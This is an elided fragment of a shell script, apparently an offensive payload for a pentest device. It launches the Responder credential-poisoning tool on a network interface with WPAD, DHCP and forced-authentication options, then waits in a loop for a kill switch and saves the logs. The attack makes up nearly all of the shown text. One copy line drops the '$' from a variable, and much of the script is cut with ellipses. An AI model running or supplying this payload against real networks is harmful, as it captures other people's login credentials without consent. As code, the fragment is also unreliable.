...
# Start Responder
############################
LOG blue "Starting Responder on $INTERFACE with -v verbose mode..."

python3 Responder.py -I "$INTERFACE" -w -d -F -v\
...
while true; do
    ...
    if [ "$resp" = "1" ]; then
        ...
        # Also copy the console log for ease of debugging
        cp "$SESSION_DIR/responder_console.log" "SESSION_DIR/" 2>/dev/null

        break    # Exit the loop and finish the payload
    else
        LOG yellow "Kill switch not yet triggered - Responder continues...."
        sleep 10
    fi
done

LOG green "Payload finished."
exit 0
